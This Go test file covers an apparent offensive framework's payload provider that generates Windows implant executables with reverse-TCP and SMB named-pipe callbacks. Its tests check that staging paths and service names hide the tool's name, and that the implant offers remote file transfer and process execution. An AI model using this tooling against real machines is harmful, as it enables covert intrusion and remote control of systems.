package main

import (
	"bytes"
	"encoding/base64"
	"encoding/binary"
	"net"
	"strconv"
	"strings"
	"testing"

	"github.com/Vibe-Pwners/hovel/sdk/go/hovel"
	"github.com/Vibe-Pwners/hovel/sdk/go/hoveltest"
)

func TestProviderReportsSquatterPayloads(t *testing.T) {
	provider := newProvider()
	if info := provider.Info(); info.Type != hovel.TypePayloadProvider {
		t.Fatalf("module type = %q", info.Type)
	}

	payloads, err := provider.ListPayloads(hovel.PayloadQuery{})
	if err != nil {
		t.Fatal(err)
	}
	if len(payloads) != 2 {
		t.Fatalf("payload count = %d", len(payloads))
	}
	for _, payload := range payloads {
		if payload.Platform != "windows" || payload.Arch != "x86" || payload.MinOS != "windows-7" {
			t.Fatalf("unexpected payload platform metadata: %#v", payload)
		}
		if len(payload.Formats) != 1 || payload.Formats[0] != "pe-exe" {
			t.Fatalf("unexpected payload formats: %#v", payload.Formats)
		}
		if payload.Session.Owner != "payload_provider" {
			t.Fatalf("unexpected session owner: %#v", payload.Session)
		}
	}
}

func TestProviderReportsStepContracts(t *testing.T) {
	contracts, err := newProvider().DescribeSteps()
	if err != nil {
		t.Fatal(err)
	}
	byID := map[string]hovel.StepContract{}
	for _, step := range contracts.Steps {
		byID[step.ID] = step
	}
	for _, id := range []string{
		"squatter.generate",
		"squatter.install_smb",
		"squatter.connect_smb",
		"squatter.install_tcp_bind",
		"squatter.connect_tcp_bind",
		"squatter.listen_tcp_callback",
		"squatter.install_tcp_callback",
	} {
		if _, ok := byID[id]; !ok {
			t.Fatalf("missing step contract %s in %#v", id, contracts.Steps)
		}
	}

	connect := byID["squatter.connect_smb"]
	if connect.Kind != "session.connector" {
		t.Fatalf("connect_smb kind = %q", connect.Kind)
	}
	if len(connect.Requires) != 3 {
		t.Fatalf("connect_smb requires = %#v", connect.Requires)
	}
	if connect.Requires[0].Type != hovel.CapabilityPayloadInstance || connect.Requires[0].Attributes["transport"] != smbNamedPipe {
		t.Fatalf("payload instance requirement = %#v", connect.Requires[0])
	}
	if connect.Requires[2].Type != hovel.CapabilityCredential || connect.Requires[2].Attributes["protocol"] != "smb" {
		t.Fatalf("credential requirement = %#v", connect.Requires[2])
	}
	if len(connect.Produces) != 1 || connect.Produces[0].Type != hovel.CapabilitySessionRef {
		t.Fatalf("connect_smb produces = %#v", connect.Produces)
	}

	install := byID["squatter.install_smb"]
	if got := install.Prepare.Materializes; len(got) != 3 || got[0] != "staged_path" || got[1] != "service_name" || got[2] != "pipe_name" {
		t.Fatalf("install_smb materializes = %#v", got)
	}
}

func TestProviderPrepareSMBInstallMaterializesNeutralValues(t *testing.T) {
	prepared, err := newProvider().PrepareStep(hovel.StepPrepareRequest{
		StepID: "squatter.install_smb",
	})
	if err != nil {
		t.Fatal(err)
	}
	for _, key := range []string{"staged_path", "service_name", "pipe_name"} {
		value, ok := prepared.PreparedValues[key]
		if !ok {
			t.Fatalf("missing prepared value %s in %#v", key, prepared.PreparedValues)
		}
		text, ok := value.Value.(string)
		if !ok || text == "" {
			t.Fatalf("prepared value %s = %#v, want string", key, value.Value)
		}
		if strings.Contains(strings.ToLower(text), "hovel") || strings.Contains(strings.ToLower(text), "squatter") {
			t.Fatalf("prepared value %s contains tool marker: %q", key, text)
		}
	}
	stagedPath := prepared.PreparedValues["staged_path"].Value.(string)
	if !strings.HasPrefix(stagedPath, `C:\Windows\Temp\`) || !strings.HasSuffix(stagedPath, ".exe") {
		t.Fatalf("staged path = %q", stagedPath)
	}
	if len(prepared.PlannedOutputs) != 3 {
		t.Fatalf("planned outputs = %#v, want payload instance, endpoint, cleanup", prepared.PlannedOutputs)
	}
	if prepared.PlannedOutputs[0].Type != hovel.CapabilityPayloadInstance || prepared.PlannedOutputs[0].State != "planned" {
		t.Fatalf("payload instance = %#v", prepared.PlannedOutputs[0])
	}
	if prepared.PlannedOutputs[1].Type != hovel.CapabilityTransport || prepared.PlannedOutputs[1].Attributes["kind"] != "smb-pipe" {
		t.Fatalf("transport endpoint = %#v", prepared.PlannedOutputs[1])
	}
	if prepared.PlannedOutputs[2].Type != hovel.CapabilityCleanupHandle {
		t.Fatalf("cleanup handle = %#v", prepared.PlannedOutputs[2])
	}
}

func TestProviderPreparePreservesExistingPreparedValues(t *testing.T) {
	prepared, err := newProvider().PrepareStep(hovel.StepPrepareRequest{
		StepID: "squatter.install_smb",
		ExistingPreparedValues: map[string]hovel.PreparedValue{
			"staged_path":  {Value: `C:\Windows\Temp\abc123.exe`, Editable: true},
			"service_name": {Value: "svc123", Editable: true},
			"pipe_name":    {Value: "pipe123", Editable: true},
		},
	})
	if err != nil {
		t.Fatal(err)
	}
	if got := prepared.PreparedValues["staged_path"].Value; got != `C:\Windows\Temp\abc123.exe` {
		t.Fatalf("staged_path = %#v", got)
	}
	if got := prepared.PreparedValues["service_name"].Value; got != "svc123" {
		t.Fatalf("service_name = %#v", got)
	}
	if got := prepared.PreparedValues["pipe_name"].Value; got != "pipe123" {
		t.Fatalf("pipe_name = %#v", got)
	}
}

func TestProviderGeneratesWindowsPEArtifactSet(t *testing.T) {
	generated, err := newProvider().GeneratePayload(hovel.GeneratePayloadRequest{
		Target:    "target-1",
		PayloadID: "squatter/windows/x86/windows-7/reverse-tcp/pe-exe",
		Format:    "pe-exe",
	})
	if err != nil {
		t.Fatal(err)
	}
	if generated.Primary.Role != "primary" || generated.Primary.Encoding != "base64" {
		t.Fatalf("primary artifact = %#v", generated.Primary)
	}
	body, err := base64.StdEncoding.DecodeString(generated.Primary.Bytes)
	if err != nil {
		t.Fatal(err)
	}
	if len(body) < 2 || string(body[:2]) != "MZ" {
		t.Fatalf("generated payload is not a PE image: %x", body[:2])
	}
	if !bytes.Contains(body, []byte("SQUAT001")) || !bytes.Contains(body, []byte("SQCFG001")) {
		t.Fatal("generated payload is missing squatter metadata markers")
	}
	if len(generated.Artifacts) != 1 {
		t.Fatalf("artifact count = %d", len(generated.Artifacts))
	}

	configOffset := bytes.Index(body, []byte("SQCFG001"))
	if configOffset < 0 {
		t.Fatal("generated payload is missing config marker")
	}
	if got := binary.LittleEndian.Uint32(body[configOffset+payloadConfigKindOffset:]); got != payloadConfigKindReverseTCP {
		t.Fatalf("transport kind = %d", got)
	}
	if got := body[configOffset+payloadConfigHostOffset : configOffset+payloadConfigHostOffset+4]; !bytes.Equal(got, []byte{127, 0, 0, 1}) {
		t.Fatalf("reverse host = %v", got)
	}
	if got := binary.LittleEndian.Uint16(body[configOffset+payloadConfigPortOffset:]); got != 4444 {
		t.Fatalf("reverse port = %d", got)
	}
}

func TestProviderPatchesPayloadConfigFromListener(t *testing.T) {
	generated, err := newProvider().GeneratePayload(hovel.GeneratePayloadRequest{
		Target:    "target-1",
		PayloadID: "squatter/windows/x86/windows-7/reverse-tcp/pe-exe",
		Format:    "pe-exe",
		Config:    map[string]string{"payload.transport": reverseTCP, "payload.lhost": "10.1.2.3", "payload.lport": "1"},
		Listener:  &hovel.ListenerRef{Host: "127.0.0.1", Port: 31337},
	})
	if err != nil {
		t.Fatal(err)
	}
	body, err := base64.StdEncoding.DecodeString(generated.Primary.Bytes)
	if err != nil {
		t.Fatal(err)
	}
	configOffset := bytes.Index(body, []byte("SQCFG001"))
	if configOffset < 0 {
		t.Fatal("generated payload is missing config marker")
	}
	if got := binary.LittleEndian.Uint16(body[configOffset+payloadConfigPortOffset:]); got != 31337 {
		t.Fatalf("reverse port = %d", got)
	}
}

func TestProviderPatchesSMBNamedPipePayloadConfig(t *testing.T) {
	generated, err := newProvider().GeneratePayload(hovel.GeneratePayloadRequest{
		Target:    "target-1",
		PayloadID: "squatter/windows/x86/windows-7/smb-named-pipe/pe-exe",
		Format:    "pe-exe",
		Config:    map[string]string{"payload.transport": smbNamedPipe, "payload.pipe": "hovel-squatter-target-1"},
	})
	if err != nil {
		t.Fatal(err)
	}
	body, err := base64.StdEncoding.DecodeString(generated.Primary.Bytes)
	if err != nil {
		t.Fatal(err)
	}
	configOffset := bytes.Index(body, []byte("SQCFG001"))
	if configOffset < 0 {
		t.Fatal("generated payload is missing config marker")
	}
	if got := binary.LittleEndian.Uint32(body[configOffset+payloadConfigKindOffset:]); got != payloadConfigKindSMBPipe {
		t.Fatalf("transport kind = %d", got)
	}
	if !bytes.Contains(body[configOffset:], []byte{'h', 0, 'o', 0, 'v', 0, 'e', 0, 'l', 0}) {
		t.Fatal("patched payload does not contain UTF-16LE pipe name")
	}
}

func TestProviderNormalizesRemoteSMBPipePathForPayload(t *testing.T) {
	got := normalizeNamedPipe(`\\target-1\pipe\hovel-squatter-target-1`)
	if want := `\\.\pipe\hovel-squatter-target-1`; got != want {
		t.Fatalf("pipe = %q, want %q", got, want)
	}
}

func TestProviderSatisfiesPayloadProviderRPCContract(t *testing.T) {
	hoveltest.AssertPayloadProviderContract(t, newProvider(), hoveltest.PayloadProviderContract{
		Query: hovel.PayloadQuery{
			Transport: reverseTCP,
			Format:    formatPEEXE,
		},
		Target:        "target-1",
		RunID:         "run-1",
		Config:        map[string]string{"payload.transport": reverseTCP, "payload.lhost": "127.0.0.1", "payload.lport": "0"},
		WantFormat:    formatPEEXE,
		WantTransport: reverseTCP,
		WantCapabilities: []string{
			"file.get",
			"file.put",
			"process.exec",
			"process.tasklist",
			"library.rundll",
		},
	})
}

func TestPlaceholderLPReverseTCPPreparesListener(t *testing.T) {
	lp := newPlaceholderLP()
	provider := Provider{lp: lp}
	listener, err := provider.PrepareListener(hovel.PrepareListenerRequest{
		RunID:     "run-1",
		Target:    "target-1",
		PayloadID: "squatter/windows/x86/windows-7/reverse-tcp/pe-exe",
		Config:    map[string]string{"payload.lhost": "127.0.0.1", "payload.lport": "0"},
	})
	if err != nil {
		t.Fatal(err)
	}
	defer func() {
		_, _ = provider.CleanupPayload(hovel.CleanupPayloadRequest{Target: "target-1", Reason: "test"})
	}()
	if listener.Transport != "squatter/reverse-tcp" || listener.Host != "127.0.0.1" || listener.Port == 0 {
		t.Fatalf("listener = %#v", listener)
	}
	if _, ok := lp.listener("target-1"); !ok {
		t.Fatal("listener was not recorded in placeholder LP")
	}
}

func TestPlaceholderLPReverseTCPAcceptsCallback(t *testing.T) {
	lp := newPlaceholderLP()
	provider := Provider{lp: lp}
	listener, err := provider.PrepareListener(hovel.PrepareListenerRequest{
		RunID:     "run-1",
		Target:    "target-1",
		PayloadID: "squatter/windows/x86/windows-7/reverse-tcp/pe-exe",
		Config:    map[string]string{"payload.lhost": "127.0.0.1", "payload.lport": "0"},
	})
	if err != nil {
		t.Fatal(err)
	}
	defer func() {
		_, _ = provider.CleanupPayload(hovel.CleanupPayloadRequest{Target: "target-1", Reason: "test"})
	}()

	conn, err := net.Dial("tcp", net.JoinHostPort(listener.Host, strconv.Itoa(listener.Port)))
	if err != nil {
		t.Fatal(err)
	}
	defer conn.Close()
	if _, err := conn.Write([]byte{'S', 'Q', 'U', 'A', 'T', 'T', 'E', 'R', 0x01, 0x00, 0x00, 0x00}); err != nil {
		t.Fatal(err)
	}

	session, err := provider.ConnectSession(hovel.ConnectSessionRequest{
		RunID:     "run-1",
		Target:    "target-1",
		PayloadID: "squatter/windows/x86/windows-7/reverse-tcp/pe-exe",
		Config:    map[string]string{"payload.transport": reverseTCP},
	})
	if err != nil {
		t.Fatal(err)
	}
	if session.Transport != "squatter/reverse-tcp" || session.State != "open" {
		t.Fatalf("session = %#v", session)
	}
}

func TestPlaceholderLPSMBConnectsProviderOwnedSession(t *testing.T) {
	lp := newPlaceholderLP()
	provider := Provider{lp: lp}
	session, err := provider.ConnectSession(hovel.ConnectSessionRequest{
		RunID:     "run-1",
		Target:    "target-1",
		PayloadID: "squatter/windows/x86/windows-7/smb-named-pipe/pe-exe",
		Config:    map[string]string{"payload.transport": smbNamedPipe, "payload.pipe": "hovel-squatter-target-1"},
	})
	if err != nil {
		t.Fatal(err)
	}
	if session.Transport != "squatter/smb-named-pipe" || session.Kind != "agent" || session.State != "pending_post_throw_connect" {
		t.Fatalf("session = %#v", session)
	}
	if _, ok := lp.session("target-1"); !ok {
		t.Fatal("session was not recorded in placeholder LP")
	}
	cleanup, err := provider.CleanupPayload(hovel.CleanupPayloadRequest{Target: "target-1", Reason: "test"})
	if err != nil {
		t.Fatal(err)
	}
	if cleanup.Status != "ok" {
		t.Fatalf("cleanup = %#v", cleanup)
	}
	if _, ok := lp.session("target-1"); ok {
		t.Fatal("session was not removed during cleanup")
	}
}
